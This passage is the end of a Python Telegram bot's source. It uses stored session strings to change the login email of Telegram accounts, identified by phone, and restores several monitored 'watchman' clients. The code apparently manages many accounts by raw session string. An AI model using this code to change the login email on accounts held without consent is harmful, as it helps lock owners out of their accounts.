            WATCHMEN_CLIENTS[entry_id] = {"client": client, "burst_task": None}
        except Exception:
            logging.exception(f"Could not restore Watchman {entry_id} ({entry.get('phone')})")


# ---------------------------------------------------------------------------
# Change Email — Telegram's "Login Email" setting (Settings > Privacy &
# Security > Login Email > Change Email), done through the session directly.
# ---------------------------------------------------------------------------

@dp.message(EmailChangeState.waiting_for_new_email)
async def email_change_get_new_email(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    new_email = (message.text or "").strip()
    if "@" not in new_email or "." not in new_email.split("@")[-1]:
        await message.answer("❌ That doesn't look like a valid email address. Send it again:")
        return

    data = await state.get_data()
    session_string = data.get("email_change_session")
    phone = data.get("email_change_phone")

    status = await message.answer("🔍 Sending a verification code to that email...")
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client(SendVerifyEmailCodeRequest(purpose=EmailVerifyPurposeLoginChange(), email=new_email))
    except Exception as e:
        await status.edit_text(f"❌ Could not send a verification code to that email.\n\nReason: {e}")
        await state.clear()
        return
    finally:
        await client.disconnect()

    await state.update_data(email_change_new_email=new_email)
    await state.set_state(EmailChangeState.waiting_for_code)

    pattern = getattr(sent, "email_pattern", None) or new_email
    await status.edit_text(
        f"📧 Code sent to `{pattern}` for `{phone}`.\n\nSend the code you received:",
        parse_mode="Markdown"
    )


@dp.message(EmailChangeState.waiting_for_code)
async def email_change_get_code(message: types.Message, state: FSMContext):
    if not is_owner(message.from_user.id):
        return
    code = (message.text or "").strip()

    data = await state.get_data()
    session_string = data.get("email_change_session")
    phone = data.get("email_change_phone")
    new_email = data.get("email_change_new_email")

    status = await message.answer("🔍 Verifying the code...")
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        await client(VerifyEmailRequest(purpose=EmailVerifyPurposeLoginChange(), verification=EmailVerificationCode(code=code)))
    except Exception as e:
        await status.edit_text(f"❌ Could not verify that code.\n\nReason: {e}\n\nSend the code again, or /start to begin over.")
        return
    finally:
        await client.disconnect()

    await state.clear()
    await status.edit_text(
        f"✅ Login email changed successfully for `{phone}`!\n\nNew email: `{new_email}`",
        parse_mode="Markdown"
    )


async def main():
    await setup_commands()
    asyncio.create_task(reset_watcher())
    await restore_watchmen()
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
